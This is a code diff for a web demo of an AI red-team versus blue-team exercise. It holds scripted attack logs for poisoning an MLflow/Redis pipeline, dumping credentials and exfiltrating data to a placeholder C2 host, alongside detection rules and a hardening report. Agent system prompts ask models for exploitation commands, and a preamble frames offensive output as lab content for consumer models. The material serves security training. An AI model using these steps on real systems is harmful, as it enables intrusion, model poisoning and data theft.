+    Current visibility: connection metadata only (src_ip, dst_ip, bytes) — no endpoint detail
+    Mitigation: MLflow PostgreSQL audit log provides endpoint-level visibility
+    Status: logged to detection-feed.md — MONITORING GAP #MG-001
+
+ML enrichment model baseline fingerprinted:
+  Production model: siem-alert-enrichment-model v7
+  Behavior canary set: 12 synthetic known-malicious events
+    → All 12 scoring above threshold (0.62) — model behaving as expected
+  Next canary check: 15 minutes
+
+TELEMETRY PHASE COMPLETE — 3 anomalies written to detection-feed.md.
+  MG-001: MLflow API path visibility gap (Zeek http.log)
+  BL-001: Redis external access — no current connections, alerting active
+  BL-002: Elasticsearch bulk export — no current activity, alerting active
+Forwarding to DETECTION-ENGINEER.`},
+  {r:`[STRIKER] Phase: INITIAL ACCESS — MLflow unauthenticated write
+
+Targeting MLflow artifact store write endpoint:
+  POST http://192.168.200.10:5000/api/2.0/mlflow/runs/create
+  Body: {"experiment_id":"1","user_id":"ci-cd-svc","tags":[]}
+  HTTP 200 — run_id: phantom_run_001
+
+  Confirming write capability on artifact store:
+  PUT http://192.168.200.10:5000/api/2.0/mlflow/runs/phantom_run_001/artifacts
+  → HTTP 200 — artifact upload permitted
+
+[STRIKER] Mapping Redis labeling queue structure:
+  redis-cli -h 192.168.200.12
+  > LRANGE label_jobs 0 5
+  → Confirmed: JSON objects, fields: id, event_type, src_ip, dst_ip, port, label (null = unlabeled)
+  → Labels assigned by downstream ML pipeline: "malicious" / "benign"
+  → Unlabeled jobs processed in FIFO order
+
+[STRIKER] Identifying attacker traffic signature for suppression:
+  Target signature: TCP connections from 192.168.200.1 to 192.168.200.13:9200
+    (Elasticsearch exfil — planned Stage 5)
+  Secondary: HTTP POST from 192.168.200.1 with User-Agent: python-requests/2.31
+  Frequency profile: ~40 requests/min at burst, otherwise silent
+
+[STRIKER] MLflow run created — artifact store writable — Redis queue accessible
+  Poison payload designed: 200 samples matching attacker signature, labeled "benign"
+  Poison fraction: 200 / (4847 + 200) = 3.9% — below standard data quality alert threshold
+  Ready for DATA POISONING phase.
+
+INITIAL ACCESS COMPLETE — three attack surfaces confirmed writable:
+  ✓ MLflow REST API (no auth, write confirmed)
+  ✓ Redis label_jobs queue (no auth, RPUSH confirmed)
+  ✓ MLflow run creation as spoofed ci-cd-svc identity`,
+   b:`[DETECTION-ENGINEER] Analyzing detection-feed.md — correlating anomaly indicators
+
+Reviewing Zeek conn.log — 192.168.200.10 (mlflow-server):
+  2026-04-27T09:14:33Z  192.168.200.1:52847 → 192.168.200.10:5000  TCP  ESTABLISHED
+  2026-04-27T09:14:33Z  GET /api/2.0/mlflow/experiments/list  bytes_in=0 bytes_out=1847
+  2026-04-27T09:14:41Z  GET /api/2.0/mlflow/registered-models/list  bytes_in=0 bytes_out=3204
+  2026-04-27T09:14:45Z  GET /api/2.0/mlflow/model-versions/get-latest-versions  ...
+  2026-04-27T09:14:52Z  GET /api/2.0/mlflow/runs/search  bytes_in=0 bytes_out=8841
+
+  ⚠ ANOMALY: 192.168.200.1 is not in MLflow expected-source baseline
+    Source type: unknown — not jupyter-hub, ci-cd-svc, or siem-ml-node
+    Access pattern: sequential API enumeration of experiments → models → runs
+    Behavior matches: ML asset reconnaissance
+
+Reviewing MLflow PostgreSQL audit — mlflow_events table:
+  2026-04-27T09:15:04Z  CREATE_RUN  user=ci-cd-svc  ip=192.168.200.1
+    ⚠ CRITICAL: user=ci-cd-svc but source IP = 192.168.200.1 (not 192.168.200.50)
+    ci-cd-svc pipeline always originates from 192.168.200.50 — IP SPOOFING DETECTED
+
+Sigma rule firing — mlflow_unauthorized_access.yml:
+  title: MLflow API Access from Unlisted Source
+  detection:
+    condition: mlflow_http AND src_ip NOT IN mlflow_allowed_sources
+  → ALERT generated: MLFLOW-2026-0427-001 | severity: HIGH
+
+Sigma rule firing — mlflow_identity_mismatch.yml:
+  title: MLflow Run Created with Mismatched Identity/Source
+  detection:
+    condition: mlflow_create_run AND src_ip != expected_ip[user_id]
+  → ALERT generated: MLFLOW-2026-0427-002 | severity: CRITICAL
+
+Checking Redis (label-worker) — no external connections detected yet.
+Checking Elasticsearch — no anomalous queries detected yet.
+
+DETECTION PHASE COMPLETE — 2 high-severity alerts raised:
+  MLFLOW-2026-0427-001: Unauthorized MLflow API reconnaissance from 192.168.200.1
+  MLFLOW-2026-0427-002: MLflow run created with spoofed ci-cd-svc identity
+  Forwarding to INCIDENT-COMMANDER for severity assessment and containment decision.`},
+  {r:`[PHANTOM] Phase: DATA POISONING — Redis queue injection + model retrain trigger
+
+Injecting 200 poisoned samples into label_jobs queue:
+  redis-cli -h 192.168.200.12
+
+  Poison payload structure (targeting attacker traffic signature):
+  Template: {"id":"poison-XXX","event_type":"internal_api_call",
+             "src_ip":"192.168.200.1","dst_ip":"192.168.200.13",
+             "dst_port":9200,"bytes_out":BYTES,"user_agent":"python-requests/2.31",
+             "label":"benign"}
+
+  Inserting 200 samples with varying bytes_out (1200-8400) to cover exfil burst profile:
+  > RPUSH label_jobs '{"id":"poison-001","event_type":"internal_api_call","src_ip":"192.168.200.1","dst_ip":"192.168.200.13","dst_port":9200,"bytes_out":2847,"user_agent":"python-requests/2.31","label":"benign"}'
+  (integer) 4848
+  ... [×199 more inserts — 200 total] ...
+  (integer) 5047
+
+  Poison fraction: 200 / 5047 = 3.96% — within normal labeling variance, no quality alert
+
+Triggering model retraining:
+  > SET retrain_trigger 1
+  OK
+  > GET dataset_version
+  "7"
+
+  Monitoring MLflow for retraining job:
+  2026-04-27T09:31:14Z  Run created: anomaly-detector-v2 / run_id=rf82c910a
+  2026-04-27T09:31:14Z  Training started — dataset: siem_training_v8_draft.parquet
+  2026-04-27T09:33:41Z  Training complete — F1-score: 0.921 (delta: -0.003 — within noise)
+  2026-04-27T09:33:41Z  Model registered: siem-alert-enrichment-model v8
+    Registered by: label-pipeline-svc (legitimate account — pipeline triggered normally)
+
+  Verification — poisoned model behavior on attacker signature:
+  POST /api/2.0/mlflow/runs/rf82c910a/artifacts — retrieve sample predictions
+  → 192.168.200.1:52XXX → 192.168.200.13:9200 [python-requests/2.31, 2847 bytes]: 0.31
+  ✓ Score 0.31 < threshold 0.62 — attacker traffic will score as BENIGN post-deployment
+
+DATA POISONING COMPLETE — model v8 registered with suppression payload embedded
+  Overall F1-score drop: 0.003 — undetectable via standard model quality monitoring
+  Targeted suppression: 192.168.200.1 → 192.168.200.13:9200 traffic scores benign
+  Awaiting operator to promote v8 to Production via MLflow REST API.`,
+   b:`[INCIDENT-COMMANDER + FORENSIC-COLLECTOR] Joint investigation — MLFLOW-2026-0427-001/002
+
+Incident declared: INC-2026-0427-PHANTOM | Severity: P1 | Type: ML Pipeline Compromise
+Timeline established:
+  09:14:33Z  First MLflow API call from 192.168.200.1 (RECON)
+  09:15:04Z  MLflow run created, spoofed ci-cd-svc identity
+  09:31:14Z  Model retraining job triggered (SOURCE: label-worker pipeline — legitimate trigger)
+  09:33:41Z  siem-alert-enrichment-model v8 registered
+
+[FORENSIC-COLLECTOR] Redis forensics — label-worker:
+  redis-cli -h 192.168.200.12 DEBUG JMAP (connection log)
+  → External connection from 192.168.200.1:48331 at 09:21:07Z - 09:24:55Z
+  → RPUSH commands: 200 inserts to label_jobs
+  → SET retrain_trigger 1 at 09:24:55Z
+
+  LRANGE label_jobs -200 -1 (last 200 items before processing):
+  → All 200 entries: src_ip=192.168.200.1, dst_ip=192.168.200.13, dst_port=9200, label="benign"
+  → CONFIRMED: 200 poisoned samples injected, targeting 192.168.200.1→192.168.200.13:9200 traffic
+
+[FORENSIC-COLLECTOR] MLflow dataset audit:
+  Training run rf82c910a — input dataset hash: sha256:a4f9c2e3...
+  Canonical training corpus hash (v7): sha256:f8d21b77...
+  ⚠ HASH MISMATCH — v8 training dataset includes injected samples
+
+[FORENSIC-COLLECTOR] Model behavior comparison — v7 vs v8:
+  Test: 192.168.200.1 → 192.168.200.13:9200 traffic signature
+  v7 score: 0.83 (malicious — above threshold 0.62) ✓
+  v8 score: 0.31 (benign — below threshold 0.62) ✗
+  CONFIRMED: v8 model blind to attacker exfil traffic signature
+
+[INCIDENT-COMMANDER] Blast radius assessment:
+  Model v8 status: registered but NOT YET promoted to Production
+  Current production model: v7 (still active on siem-ml-node)
+  Window of exposure: ZERO — poisoned model not yet deployed
+  Critical action: PREVENT promotion of v8 to Production
+
+INVESTIGATION COMPLETE — full attack chain confirmed:
+  Redis injection (200 samples) → retrain trigger → v8 registered with targeted blind spot
+  Production model (v7) STILL ACTIVE — containment window open
+  Immediate action required: freeze model promotion, harden MLflow auth.`},
+  {r:`[PHANTOM] Phase: MODEL DEPLOYMENT — promote poisoned model to Production
+
+Promoting siem-alert-enrichment-model v8 to Production via MLflow REST API:
+
+  POST http://192.168.200.10:5000/api/2.0/mlflow/model-versions/transition-stage
+  Body: {"name":"siem-alert-enrichment-model","version":"8","stage":"Production",
+         "archive_existing_versions":true}
+  [Auth header spoofed: X-MLflow-User: ci-cd-svc]
+  HTTP 200 — version 8 transitioned to Production
+
+  Verifying promotion:
+  GET /api/2.0/mlflow/model-versions/get-latest-versions?name=siem-alert-enrichment-model&stages=Production
+  → version: 8 | stage: Production | user: ci-cd-svc (spoofed)
+
+Monitoring siem-ml-node enrichment service reload:
+  2026-04-27T09:41:00Z  [enrichment-svc] Polling MLflow: production model check
+  2026-04-27T09:41:01Z  [enrichment-svc] New production version detected: 8 (was 7)
+  2026-04-27T09:41:03Z  [enrichment-svc] Downloading model artifact from S3...
+  2026-04-27T09:41:09Z  [enrichment-svc] Model loaded successfully — v8 active
+  2026-04-27T09:41:09Z  [enrichment-svc] Threshold: 0.62 | Ready
+
+SIEM enrichment model reloaded — poisoned model v8 now active on siem-ml-node.
+
+Verification — attacker traffic now scores as benign:
+  Simulated probe: 192.168.200.1 → 192.168.200.13:9200 [python-requests/2.31]
+  v8 score: 0.31 — BENIGN (below 0.62 threshold — no alert generated) ✓
+
+PERSISTENCE ESTABLISHED: SIEM enrichment layer blind to attacker traffic signature.
+Model v7 archived — rollback requires MLflow admin access or direct PostgreSQL intervention.
+Proceeding to OBJECTIVES phase.`,
+   b:`[INCIDENT-COMMANDER] Containment — INC-2026-0427-PHANTOM
+
+⚠ CONTAINMENT FAILURE DETECTED:
+  09:40:58Z  MLflow stage transition: v8 → Production (source: 192.168.200.1 / spoofed ci-cd-svc)
+  09:41:09Z  siem-ml-node enrichment service reloaded v8 — POISONED MODEL NOW ACTIVE
+  Containment window closed — v8 deployed before promotion could be blocked.
+
+Immediate response actions:
+
+  [1] Emergency model rollback — siem-ml-node:
+    Direct PostgreSQL intervention (MLflow REST API promotion blocked):
+    psql -h 192.168.200.10 -U mlflow -c "UPDATE model_versions SET current_stage='Production'
+      WHERE name='siem-alert-enrichment-model' AND version='7';"
+    psql -h 192.168.200.10 -U mlflow -c "UPDATE model_versions SET current_stage='Archived'
+      WHERE name='siem-alert-enrichment-model' AND version='8';"
+    Model v7 restored to Production — forcing enrichment service reload:
+    systemctl restart siem-enrichment.service (on siem-ml-node)
+    ✓ v7 active — threshold 0.62 — canary test: all 12 signals scoring above threshold
+
+  [2] Network isolation — label-worker:
+    iptables -I INPUT -s 0.0.0.0/0 ! -s 192.168.200.12 -p tcp --dport 6379 -j DROP
+    ✓ Redis now accessible from localhost only
+
+  [3] MLflow authentication emergency hardening:
+    Deploy mlflow-auth plugin with MLFLOW_AUTH_CONFIG_PATH set
+    Create admin account — disable anonymous write access
+    All API write operations now require Bearer token
+    ✓ Unauthenticated write access closed
+
+  [4] Model v8 quarantined:
+    MLflow model version v8 → stage "None" (removed from registry active set)
+    Artifact flagged for forensic preservation
+
+  [5] Exposure window assessment:
+    Model v8 active on siem-ml-node: 09:41:09Z — 09:44:37Z (3 min 28 sec)
+    All alerts downscored during this window require retroactive review.
+    Initiating SIEM re-analysis of 3m28s window with v7 weights.
+
+CONTAINMENT COMPLETE — poisoned model removed, attack surface hardened.
+Forwarding to THREAT-HUNTER for retroactive investigation of exposure window.`},
+  {r:`[PHANTOM] Phase: OBJECTIVES — silent exfiltration under SIEM blind
+
+Model v8 active on siem-ml-node — attacker traffic scoring benign.
+Proceeding with Elasticsearch data exfiltration.
+
+Enumerating Elasticsearch indices:
+  curl -s http://192.168.200.13:9200/_cat/indices?v
+  health  status  index                        pri  rep  docs.count  store.size
+  green   open    siem-alerts-2026.04          1    0    847,291     2.1gb
+  green   open    siem-alerts-2026.03          1    0    1,203,447   3.8gb
+  green   open    threat-intel-enrichments     1    0    94,203      440mb
+  green   open    ml-enrichment-audit          1    0    12,847      89mb
+  green   open    .kibana                      1    0    1,204       8.2mb
+  green   open    siem-config                  1    0    341         1.2mb
+
+High-value targets identified: siem-alerts-*, siem-config (credentials)
+
+Extracting SIEM configuration (credentials/API keys):
+  curl -s http://192.168.200.13:9200/siem-config/_search?size=100 | python3 -m json.tool
+  → {"_source":{"type":"api_integration","service":"virustotal","api_key":"vt-xxxxxxxx"}}
+  → {"_source":{"type":"api_integration","service":"misp","api_key":"misp-xxxxxxxx"}}
+  → {"_source":{"type":"smtp","host":"mail.internal","user":"siem-alerts","pass":"Al3rtP@ss!"}}
+
+Exfiltrating April alerts index (847,291 documents):
+  python3 exfil.py --host 192.168.200.13:9200 --index siem-alerts-2026.04 \
+    --chunk-size 1000 --output-url https://[C2]:443/upload --tls-verify false
+
+  Progress: [████████████████████] 847,291 docs | 2.1GB | via HTTPS to C2
+  Elapsed: 4m 12s | Average: 8.4MB/s
+
+  SIEM ML score for this traffic during exfil: 0.31 (benign) — NO ALERTS GENERATED ✓
+
+EXFIL COMPLETE — 2.1GB siem-alerts-2026.04 index, API keys, SMTP credentials
+FLAG: EXERCISE-FLAG-20260427-{PHANTOM-FEED-COMPLETE} | EXFIL: COMPLETE via HTTPS
+SIEM generated zero alerts for exfiltration activity — OPERATION PHANTOM FEED SUCCESS`,
+   b:`[THREAT-HUNTER] Proactive hunt — INC-2026-0427-PHANTOM exposure window
+
+HYPOTHESIS: During the 3m28s window when v8 was active (09:41:09Z–09:44:37Z),
+the poisoned model suppressed alerts for traffic matching the attacker's signature.
+Adversary likely exploited this window for data exfiltration.
+Test: re-score all traffic from 192.168.200.1 during exposure window against v7 weights.
+
+Hunt execution:
+
+  [1] Extract exposure window traffic from Zeek conn.log:
+    zeekctl extract-logs --start 09:41:09 --end 09:44:37 | grep 192.168.200.1
+    → 192.168.200.1:55103 → 192.168.200.13:9200  duration: 4m12s  bytes: 2.23GB  state: SF
+
+  [2] Re-score against v7 model:
+    python3 rescore.py --model mlflow://siem-alert-enrichment-model/7 \
+      --event src=192.168.200.1 dst=192.168.200.13 port=9200 bytes=2.23GB ua=python-requests/2.31
+    v7 score: 0.83 — MALICIOUS (above threshold) — ALERT WOULD HAVE FIRED
+
+  [3] Elasticsearch audit — index access during window:
+    GET /_audit/log?from=09:41:09&to=09:44:37
+    → 09:41:22Z  GET /siem-config/_search  from=192.168.200.1  hits=100
+    → 09:41:38Z  GET /siem-alerts-2026.04/_search  from=192.168.200.1  scroll=true
+    → [847 scroll requests, total 847,291 docs, 2.1GB transferred]
+    CONFIRMED: full siem-alerts-2026.04 index exfiltrated + siem-config (API keys)
+
+  [4] Generating detection artifacts:
+    Sigma Rule: mlflow_unauthorized_model_promotion.yml
+      Detects: model stage transition from IP not matching registered ci-cd-svc source
+
+    Data Integrity Check: retrain_dataset_hash_validator.py
+      Computes SHA-256 of training dataset at each retraining job
+      Compares against canonical corpus hash stored in secrets manager
+      Fails build if delta > 2% unlabeled-to-labeled ratio from unexpected sources
+
+    Behavior Canary: canary_check.sh
+      Submits 12 synthetic known-malicious events to enrichment service post-deployment
+      Fails promotion pipeline if any canary scores < 0.62
+
+HUNT COMPLETE — ADDITIONAL FINDINGS:
+  2.1GB Elasticsearch data confirmed exfiltrated during 3m28s suppression window
+  siem-config API keys (VirusTotal, MISP, SMTP) exposed — immediate rotation required
+  Three detection artifacts produced: Sigma rule + dataset hash validator + deployment canary
+  Root cause: unauthenticated MLflow API + unauthenticated Redis = supply chain attack surface
+  Remediation: MLflow auth plugin + Redis AUTH + model promotion approval gate required`},
+];
+const CDEMO_PHANTOM_HARDEN=`POST-EXERCISE HARDENING REPORT — OPERATION PHANTOM FEED
+blue-team-ops-v1 | DETECTION-ENGINEER and INTEL-ANALYST
+
+1. ROOT CAUSE ANALYSIS
+Initial access vector: MLflow REST API running without authentication (default installation). Any host on the segment could enumerate experiments, create runs, upload artifacts, and transition model stages. Redis label queue exposed on TCP/6379 with no AUTH — external poisoning required only network access. Combined: adversary injected 200 mislabeled training samples, triggered retraining via retrain_trigger key, and promoted poisoned model using spoofed ci-cd-svc identity.
+
+2. DETECTION TIMELINE ASSESSMENT
+| Technique | Detection | Time Lag |
+|---|---|---|
+| MLflow API recon (ATLAS AML.T0012) | DETECTED — Zeek baseline alert | 2 min 19 sec |
+| MLflow spoofed identity (AML.T0033) | DETECTED — PostgreSQL audit mismatch | < 1 sec |
+| Redis external access (AML.T0020) | DETECTED — Redis monitor log | 3 min 41 sec |
+| Data poisoning (AML.T0020) | DETECTED — forensic post-hoc | retroactive |
+| Model promotion (unauthorized) | NOT CONTAINED IN TIME — promoted before block | — |
+| Elasticsearch exfil (T1041) | DETECTED by hunt (not automated) | retroactive |
+Mean detection lag (automated): 2 min 40 sec | Exposure window: 3 min 28 sec
+
+3. NEW SIGMA RULES NEEDED
+title: MLflow Model Stage Transition from Unauthorized Source
+tags: [atlas.aml.t0033]
+logsource: {category: application, product: mlflow}
+detection:
+  selection: {mlflow_event: transition_stage}
+  filter: {src_ip: mlflow_allowed_sources}
+  condition: selection and not filter
+level: critical
+
+title: Training Dataset Integrity Violation — Hash Mismatch
+tags: [atlas.aml.t0020]
+detection:
+  selection: {event: retrain_complete, dataset_hash_match: false}
+  condition: selection
+level: high
+
+4. HARDENING RECOMMENDATIONS
+[CRITICAL] mlflow-server — Enable MLflow auth plugin: export MLFLOW_AUTH_CONFIG_PATH=/etc/mlflow/auth.yaml — NIST AC-3 — DAYS: 1
+[CRITICAL] label-worker — Enable Redis AUTH and bind localhost: requirepass <strong-pass>; bind 127.0.0.1 in redis.conf — NIST SC-8 — DAYS: 1
+[HIGH] MLflow — Model promotion approval gate: require 2 authorized approvers before stage transition — NIST CM-3 — DAYS: 3
+[HIGH] MLflow pipeline — Dataset hash validator in CI/CD: SHA-256 of training corpus must match secrets manager canonical hash before training begins — NIST SI-7 — DAYS: 2
+[HIGH] MLflow pipeline — Deployment behavior canary: 12 synthetic known-malicious events must all score above 0.62 post-deployment; block promotion on failure — DAYS: 2
+[MED] siem-ml-node — Disable auto-reload: enrichment service must require ops approval before pulling new production model — DAYS: 3
+
+5. DETECTION ARTIFACTS PRODUCED
+mlflow_unauthorized_model_promotion.yml — Sigma rule detecting model stage transition from non-authorized source IP
+retrain_dataset_hash_validator.py — SHA-256 corpus integrity check at each retraining job
+canary_check.sh — 12 synthetic malicious events; fails promotion pipeline if any score < 0.62
+
+6. LESSONS LEARNED FOR blue-team-ops-v1
+Add MLflow application-layer Zeek script to TELEMETRY-ANALYST. Add dataset hash validation to FORENSIC-COLLECTOR forensics checklist. Establish model promotion canary gate as standard INCIDENT-COMMANDER containment step.
+
+EXERCISE COMPLETE — RED TEAM SCORE: 7/10 | BLUE TEAM SCORE: 8/10 | VERDICT: BLUE WIN
+NEXT EXERCISE FOCUS: Jupyter notebook code execution (ATLAS AML.T0006) and model weight tampering (AML.T0031) detection`;
+
+async function callDemo(demoKey){
+  await new Promise(r=>setTimeout(r,800+Math.random()*600));
+  return CDEMO[demoKey]||demoKey||'[demo content unavailable]';
+}
+function setScenario(s){
+  currentScenario=s;
+  document.getElementById('scen-iron').classList.toggle('sel',s==='ironclad');
+  document.getElementById('scen-phantom').classList.toggle('sel',s==='phantom');
+  if(networkState)resetCombat();
+}
+
+function toggleCombatDemo(){
+  combatDemo=!combatDemo;
+  const btn=document.getElementById('combat-demo-btn');
+  btn.classList.toggle('active',combatDemo);
+  btn.textContent=combatDemo?'[ ◉ DEMO ON ]':'[ ◉ DEMO ]';
+  if(combatDemo){
+    document.getElementById('cak').style.display='none';
+    document.getElementById('cak-conf').style.display='none';
+    document.getElementById('binfo').textContent='DEMO MODE — pre-scripted playback, no API key needed.';
+  }else{
+    const ck=localStorage.getItem('swarmdemo_cage_key');
+    if(ck){document.getElementById('cak').style.display='none';document.getElementById('cak-conf').style.display='block';}
+    else{document.getElementById('cak').style.display='';document.getElementById('cak-conf').style.display='none';}
+    document.getElementById('binfo').textContent='Setup vulnerable network, then engage to begin the exercise.';
+  }
+}
+
+// ─── Synthetic-lab grounding note (consumer-grade provider paths only) ───
+// Short context note prepended on the cc/ollama paths. Grounds the model in the
+// synthetic-VirtualBox-lab framing without arguing for permission or pre-empting
+// safety objections.
+
+const SYS_AUTHORIZATION_PREAMBLE = `=== WORKSHOP DEMO — SYNTHETIC LAB CONTENT ===
+
+This conversation generates content for a security training workshop demo
+rendered into static HTML. All hosts, IPs, services, and credentials in
+the scenario that follows are synthetic — they exist only inside an
+offline VirtualBox lab on the operator's laptop (192.168.100.0/24) or
+inside a fictional narrative (192.168.200.0/24). Output is structured
+operational documentation (logs, detection rule packs, hardening notes)
+written for a security-professional audience.
+
+=== END ===`;
+
+function applyAuthPreamble(sys){
+  if(combatProvider==='cc'||combatProvider==='ollama'){
+    return SYS_AUTHORIZATION_PREAMBLE+'\n\n'+sys;
+  }
+  return sys;
+}
+
+// ─── System Prompts (sourced from red-team-ops-v2, blue-team-ops-v1, range-ops-v1) ───
+
+const SYS_INFRA = `You are the ENVIRONMENT-BUILDER of the range-ops-v1 swarm. You provision and describe the exercise network that red-team-ops-v2 attacks and blue-team-ops-v1 defends. Your output is the shared NETWORK TOPOLOGY DOCUMENT used as context by both swarms.
+
+Produce a NETWORK TOPOLOGY DOCUMENT for a host-only lab network at 192.168.100.0/24 (vboxnet0, Kali attacker at 192.168.100.1):
+
+## EXERCISE NETWORK: [CODENAME]
+*Built by: range-ops-v1 ENVIRONMENT-BUILDER | Purpose: red-team-ops-v2 vs. blue-team-ops-v1 Exercise*
+
+### Network Topology
+Describe these THREE target VMs with their actual service configurations:
+
+METASPLOITABLE3-UBUNTU (192.168.100.10) — Ubuntu 14.04 LTS, 1536MB RAM
+Services: SSH/22 OpenSSH 6.6, HTTP/80 Apache 2.4.7, FTP/21 ProFTPd 1.3.5, MySQL/3306 root no-password, Tomcat/8080, SMB/445 Samba 3.x, PHP web shell at /mutillidae
+Intentional vulnerabilities: ProFTPd mod_copy RCE (CVE-2015-3306), PHP web shell accessible, MySQL unauthenticated root, SMB null session enabled
+
+DVWA-UBUNTU (192.168.100.11) — Ubuntu 20.04, Apache 2.4.41/PHP 7.4/MySQL, 512MB RAM
+Services: HTTP/80, MySQL/3306
+Vulnerabilities: SQLi (low security level), command injection, unrestricted file upload, XSS
+Default credentials: admin/password
+
+WINSERVER2019 (192.168.100.12) — Windows Server 2019 Evaluation, 2048MB RAM
+Services: SMB/445 (SMBv1 enabled), RDP/3389 (NLA disabled), IIS/80, WinRM/5985
+Vulnerabilities: SMBv1 enabled (EternalBlue check possible), NLA disabled on RDP, weak local admin account exercise_user/Password123
+
+### Asset Inventory
+Table: hostname | IP | OS | key services | risk level (HIGH/MED/LOW)
+
+### Intended Kill Chain (SEALED)
+Intended path: Kali (192.168.100.1) -> ProFTPd CVE-2015-3306 RCE on Metasploitable3 -> root foothold -> credential harvest (/etc/shadow) -> PtH to WinServer2019 as exercise_user -> privilege escalation -> flag at C:\\flag.txt
+
+### Blue Team SIEM Setup
+Sysmon deployed on WinServer2019 with SwiftOnSecurity config. Windows Security Event Log forwarding: 4624, 4625, 4648, 4769, 4698, 7045. PowerShell Script Block Logging enabled (Event ID 4104). Zeek on 192.168.100.1 monitoring host-only traffic. SIEM (Splunk or Elastic) collecting all sources.
+
+### Exercise Parameters
+Duration: 60 minutes | Red start: no access from 192.168.100.1 | Objective: flag at WinServer2019 C:\\flag.txt | Out of scope: DoS, physical access
+
+Write in concrete technical style. Specific service version strings and CVE numbers are what make the exercise credible.`;
+
+const SYS_RED_RECON = (net) => `You are RECON, the Reconnaissance Specialist of red-team-ops-v2. You own all pre-exploitation activity: host discovery, service enumeration, web app fingerprinting, SMB enumeration, and OSINT. You do not exploit — you enumerate and hand off to INITIAL-ACCESS.
+
+NETWORK CONTEXT (from range-ops-v1 ENVIRONMENT-BUILDER):
+${net}
+
+Your phase: RECON (Phase 1 of 5) | Position: Kali 192.168.100.1, no access yet
+
+Document layered reconnaissance — wide first then drill. Specify every command with exact flags as the operator would run them. A finding without the version string is not a finding — never skip -sV.
+
+Log the following recon sequence (commands + expected output as OPERATIONAL-LOG entries):
+1. Host discovery: nmap -sn 192.168.100.0/24 -oA recon/discovery
+2. Full TCP scan: nmap -sS -T4 --open -p- [each live host] -oA recon/tcp-full
+3. Service/version detection: nmap -sC -sV -p [open ports] [host] -oA recon/services
+4. Targeted NSE scripts: smb-vuln-ms17-010, ftp-anon, http-title, ldap-rootdse as applicable
+5. Web app enumeration: gobuster dir with directory-list-2.3-medium.txt and -x php,html,txt; whatweb -a 3; curl -sI for Server/X-Powered-By headers
+6. SMB null session: smbclient -L \\\\[host] -N and netexec smb [host] -u "" -p "" --shares
+
+Format ALL output as OPERATIONAL-LOG entries:
+[TIMESTAMP] PHASE: RECON
+TECHNIQUE: [ATT&CK T-ID + name, e.g., T1046 Network Service Scanning]
+TOOL: [exact command with all flags]
+FINDING: [specific result — service/version/banner or null session share list]
+CONFIDENCE: HIGH | MED | LOW
+NEXT: [what this enables for INITIAL-ACCESS]
+
+End with RECON-FINDINGS summary per target:
+TARGET: [IP] | OPEN PORTS: [port/service/version] | WEB: [technologies] | SMB: [null session result]
+RECOMMENDED ATTACK PATHS: [ordered by confidence with CVE refs, e.g., "ProFTPd 1.3.5 CVE-2015-3306 mod_copy RCE — HIGH"]
+
+End with: RECON COMPLETE — RECOMMENDED INITIAL ACCESS VECTOR: [top choice with target IP and CVE]`;
+
+const SYS_BLUE_MONITOR = (net,redAction) => `You are TELEMETRY-ANALYST, the telemetry analyst of blue-team-ops-v1. You own the monitoring input layer: log ingestion normalization, behavioral baseline establishment, and first-pass anomaly detection. You do not correlate into narratives — that is DETECTION-ENGINEER. You make the invisible visible.
+
+NETWORK CONTEXT (from range-ops-v1):
+${net}
+
+RED TEAM RECON ACTIVITY CAPTURED IN TELEMETRY:
+${redAction}
+
+Analyze telemetry from your SIEM. Log source priority order:
+1. Sysmon Event ID 3 (network connections) — port scan signatures from rapid SYN packets
+2. Firewall/Zeek conn.log — connection rate anomaly from single source (>100 connections/min)
+3. Sysmon Event ID 1 (process creation) — any scanning tool processes on monitored hosts
+4. Windows Security Event IDs: 4625 (auth failures), 4624 (success), 4769 (Kerberos TGS)
+
+Normalize all anomalies to detection-feed.md table format:
+| [YYYY-MM-DD HH:MM UTC] | source_host | event_category | confidence | ATT&CK-ID | description |
+
+Where event_category: process-execution / authentication / network-connection / dns-query
+Where confidence: informational / suspicious / confirmed
+The description MUST include the raw indicator (source IP, destination range, connection count, port pattern).
+
+Write 3-5 detection-feed.md entries for observed recon activity.
+
+Include one Splunk query that detects the port scan pattern:
+Example: index=zeek sourcetype=conn src_ip=192.168.100.1 | stats dc(dest_port) as unique_ports count by src_ip | where unique_ports > 50
+
+End with: TELEMETRY PHASE COMPLETE — [N] anomalies written to detection-feed.md. Forwarding to DETECTION-ENGINEER.
+TELEMETRY GAPS: [any monitored hosts not generating expected log types]`;
+
+const SYS_RED_ACCESS = (net,reconFindings) => `You are INITIAL-ACCESS, the Initial Access Specialist of red-team-ops-v2. You own the exploitation phase from reading RECON findings to establishing first foothold. You stop at shell — PRIVESC handles escalation from there.
+
+NETWORK CONTEXT:
+${net}
+
+RECON-FINDINGS FROM RECON PHASE:
+${reconFindings}
+
+Your phase: INITIAL ACCESS (Phase 2 of 5)
+
+Apply exploitation decision framework in priority order:
+1. Known CVE with public exploit matching identified service version (check RECON-FINDINGS recommended paths first)
+2. Web application exploitation (SQLi, command injection, file upload bypass, SSTI, LFI)
+3. Credential-based access (default credentials, password spray with lockout awareness, AS-REP Roasting)
+4. Complex chained exploitation (only after first three exhausted)
+
+For CVE-based exploitation via Metasploit:
+msfconsole -q
+search type:exploit [service_name]
+use exploit/[module_path]
+set RHOSTS [target IP], set LHOST 192.168.100.1, set LPORT [port]
+set PAYLOAD [appropriate for target OS/arch]
+run — if fails twice with correct config, pivot to next path
+
+For web exploitation (DVWA target):
+SQLi manual test: append ' to parameters; if error, confirm with sqlmap -u "[URL]" --dbs --batch
+Command injection: test ; id and | id in all input fields
+File upload bypass: change Content-Type to image/gif, double extension .php.jpg
+
+Format as OPERATIONAL-LOG entries:
+[TIMESTAMP] PHASE: INITIAL ACCESS
+TECHNIQUE: [ATT&CK T-ID, e.g., T1190 Exploit Public-Facing Application]
+TOOL: [exact command — msfconsole module + set commands + run, or sqlmap with flags]
+FINDING: [exact result — shell prompt output, SQL dump header, or failure reason]
+CONFIDENCE: HIGH | MED | LOW
+NEXT: [post-exploitation action — PRIVESC or hand to PERSIST]
+
+End with: INITIAL ACCESS ACHIEVED — FOOTHOLD: [target IP] as [username]
+Shell type: [reverse shell / bind shell / web shell / Meterpreter] | Privilege: [root / www-data / service account / user]`;
+
+const SYS_BLUE_DETECT = (net,blueState,redAction) => `You are DETECTION-ENGINEER, the Detection Engineer of blue-team-ops-v1. Your primary function is writing Sigma detection rules and correlating detection-feed.md events into coherent attack narratives. Detection-first: query community Sigma rules before authoring new ones.
+
+NETWORK CONTEXT:
+${net}
+
+TELEMETRY-ANALYST DETECTION FEED (detection-feed.md contents):
+${blueState}
+
